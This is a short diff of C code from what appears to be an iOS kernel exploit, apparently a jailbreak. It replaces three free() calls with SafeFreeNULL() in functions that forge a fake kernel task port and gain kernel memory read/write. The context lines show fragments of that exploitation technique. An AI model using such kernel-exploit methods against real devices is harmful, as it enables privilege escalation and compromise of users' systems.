@@ -175,7 +175,7 @@ mach_port_t* prepare_ports(int n_ports)
             for (int j = 0; j < i; j++) {
                 mach_port_deallocate(mach_task_self(), ports[j]);
             }
-            free(ports);
+            SafeFreeNULL(ports);
             return NULL;
         }
     }
@@ -374,7 +374,7 @@ mach_port_t build_safe_fake_tfp0(uint64_t vm_map, uint64_t space)
     *(uint64_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;
     *(uint8_t*)(fake_kernel_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;
     kmemcpy(fake_kernel_task_kaddr, (uint64_t)fake_kernel_task, 0x1000);
-    free(fake_kernel_task);
+    SafeFreeNULL(fake_kernel_task);
 
     uint32_t fake_task_refs = ReadKernel32(fake_kernel_task_kaddr + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT));
     LOG("read fake_task_refs: %x", fake_task_refs);
@@ -590,7 +590,7 @@ mach_port_t get_kernel_memory_rw()
     // now free first replacer and put a fake kernel task port there
     // we need to do this becase the first time around we don't know the address
     // of ipc_space_kernel which means we can't fake a port owned by the kernel
-    free(replacer_message_body);
+    SafeFreeNULL(replacer_message_body);
     replacer_message_body = build_message_payload(first_port_address, replacer_body_size, message_body_offset, kernel_vm_map, ipc_space_kernel(), &context_ptr);
     if (replacer_message_body == NULL) {
         return MACH_PORT_NULL;
